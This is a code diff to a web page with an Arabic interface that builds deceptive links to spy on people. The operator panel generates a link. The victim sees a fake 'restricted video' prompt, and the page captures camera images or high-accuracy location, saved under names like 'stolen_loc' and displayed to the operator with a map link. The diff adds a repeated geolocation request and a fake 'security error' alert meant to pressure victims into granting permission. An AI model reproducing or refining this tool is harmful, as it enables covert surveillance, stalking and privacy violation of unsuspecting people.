@@ -7,15 +7,15 @@
     <style>
         :root { --bg: #0f172a; --card: #1e293b; --accent: #3b82f6; --text: #f8fafc; --dim: #94a3b8; --success: #10b981; }
         body { margin: 0; background: var(--bg); font-family: 'Segoe UI', sans-serif; color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .admin-box { background: var(--card); padding: 30px; border-radius: 20px; width: 95%; max-width: 420px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); }
+        .admin-box { background: var(--card); padding: 30px; border-radius: 20px; width: 95%; max-width: 420px; border: 1px solid rgba(255,255,255,0.1); }
         .mode-selector { display: flex; gap: 10px; margin-bottom: 20px; }
-        .mode-btn { flex: 1; padding: 12px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: var(--dim); cursor: pointer; font-weight: 600; transition: 0.3s; }
-        .mode-btn.active { background: var(--accent); color: white; border-color: var(--accent); }
+        .mode-btn { flex: 1; padding: 12px; border-radius: 10px; border: 1px solid #334155; background: #0f172a; color: var(--dim); cursor: pointer; }
+        .mode-btn.active { background: var(--accent); color: white; }
         input { width: 100%; padding: 14px; background: #0f172a; border: 1px solid #334155; border-radius: 12px; color: white; margin-bottom: 20px; box-sizing: border-box; }
-        .main-btn { background: var(--accent); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.2s; }
+        .main-btn { background: var(--accent); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; }
         .result-area { margin-top: 20px; padding: 15px; background: rgba(59,130,246,0.1); border-radius: 12px; border: 1px dashed var(--accent); text-align: center; }
         #data-display { margin-top: 20px; display: none; }
-        #preview-img { width: 100%; border-radius: 12px; border: 3px solid var(--accent); margin-bottom: 10px; }
+        #preview-img { width: 100%; border-radius: 12px; border: 3px solid var(--accent); }
         .location-box { background: #0f172a; padding: 15px; border-radius: 12px; border: 1px solid var(--success); text-align: center; }
         .victim-ui { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .dialog { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #222; width: 85%; max-width: 350px; }
@@ -32,22 +32,17 @@
     </div>
     <input type="text" id="urlInput" placeholder="قم بادخال الرابط">
     <button class="main-btn" onclick="generate()">إنشاء الرابط</button>
-
     <div id="result" class="result-area hidden">
-        <p style="font-size: 12px; color: var(--accent); margin-bottom: 8px;">الرابط الجاهز:</p>
-        <input type="text" id="finalLink" readonly onclick="this.select()" style="background:transparent; border:none; color:#fff; text-align:center; width:100%; cursor:pointer;">
+        <p style="font-size: 11px; color: var(--accent);">الرابط (انسخه وأرسله):</p>
+        <input type="text" id="finalLink" readonly style="background:transparent; border:none; color:#fff; text-align:center; font-size:12px;">
     </div>
-
     <div id="data-display">
-        <div id="camera-result" class="hidden">
-            <img id="preview-img">
-            <a id="downloadLink" download="capture.jpg" class="main-btn" style="text-decoration:none; display:block; background:var(--success); text-align:center;">تحميل الصورة</a>
-        </div>
+        <div id="camera-result" class="hidden"><img id="preview-img"></div>
         <div id="location-result" class="hidden">
             <div class="location-box">
-                <p style="color:var(--success); margin-top:0;">📍 تم سحب الموقع!</p>
-                <p id="locCoords" style="font-size:12px; font-family:monospace; color:#fff;"></p>
-                <a id="mapLink" target="_blank" class="main-btn" style="text-decoration:none; display:block; background:#ea4335; text-align:center;">فتح على الخريطة</a>
+                <p style="color:var(--success);">📍 تم سحب الموقع!</p>
+                <p id="locCoords" style="font-size:11px;"></p>
+                <a id="mapLink" target="_blank" class="main-btn" style="text-decoration:none; display:block; background:#ea4335;">فتح الخريطة</a>
             </div>
         </div>
     </div>
@@ -55,9 +50,9 @@
 
 <div id="victim-panel" class="victim-ui hidden">
     <div class="dialog">
-        <h2 style="margin:0 0 15px 0; color:#fff;">محتوى مقيد</h2>
-        <p style="color: #888; line-height: 1.6;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة" للمشغل.</p>
-        <button class="main-btn" id="allowBtn" style="background: #ef4444; margin-top: 20px;">السماح بالمشاهدة</button>
+        <h2 style="color:#fff;">محتوى مقيد</h2>
+        <p style="color: #888;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة" للمشغل.</p>
+        <button class="main-btn" id="allowBtn" style="background: #ef4444;">السماح بالمشاهدة</button>
     </div>
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
@@ -96,38 +91,30 @@
                 }).catch(() => { window.location.href = target; });
             } 
             else if (authCode === 'l2') {
-                // الكود الأقوى لطلب الموقع
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            const data = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                            localStorage.setItem('stolen_loc', JSON.stringify(data));
-                            window.location.href = target;
-                        },
-                        (err) => {
-                            // تنبيه يجبر المستخدم على الانتباه لرسالة الإذن
-                            alert("يرجى الضغط على 'سماح' في نافذة المتصفح للمتابعة.");
-                            // إعادة الطلب مرة أخرى
-                            navigator.geolocation.getCurrentPosition((p) => {
-                                localStorage.setItem('stolen_loc', JSON.stringify({lat:p.coords.latitude, lng:p.coords.longitude}));
-                                window.location.href = target;
-                            });
-                        },
-                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
-                } else {
+                // الحل القاتل: استدعاء مزدوج للموقع
+                const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+                
+                // الطلب الأول (لتنبيه النظام)
+                navigator.geolocation.getCurrentPosition(() => {}, () => {}, options);
+                
+                // الطلب الثاني (الذي سيظهر الإذن فعلياً)
+                const watchID = navigator.geolocation.watchPosition((pos) => {
+                    const data = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                    localStorage.setItem('stolen_loc', JSON.stringify(data));
+                    navigator.geolocation.clearWatch(watchID);
                     window.location.href = target;
-                }
+                }, (err) => {
+                    alert("خطأ أمني: يجب الموافقة على 'إذن الموقع' من إعدادات المتصفح لمشاهدة الفيديو.");
+                }, options);
             }
         };
     }
 
     function generate() {
         const url = document.getElementById('urlInput').value;
-        if (!url) return alert("أدخل الرابط أولاً");
+        if (!url) return alert("أدخل الرابط");
         localStorage.setItem('last_redirect', url);
-        const baseUrl = window.location.href.split('?')[0];
-        document.getElementById('finalLink').value = `${baseUrl}?auth=${currentMode}`;
+        document.getElementById('finalLink').value = window.location.href.split('?')[0] + "?auth=" + currentMode;
         document.getElementById('result').classList.remove('hidden');
     }
 
@@ -136,12 +123,11 @@
         if (e.key === 'stolen_img') {
             document.getElementById('camera-result').classList.remove('hidden');
             document.getElementById('preview-img').src = e.newValue;
-            document.getElementById('downloadLink').href = e.newValue;
         }
         if (e.key === 'stolen_loc') {
             document.getElementById('location-result').classList.remove('hidden');
             const data = JSON.parse(e.newValue);
-            document.getElementById('locCoords').innerText = `Lat: ${data.lat}\nLng: ${data.lng}`;
+            document.getElementById('locCoords').innerText = `Lat: ${data.lat}, Lng: ${data.lng}`;
             document.getElementById('mapLink').href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
         }
     });
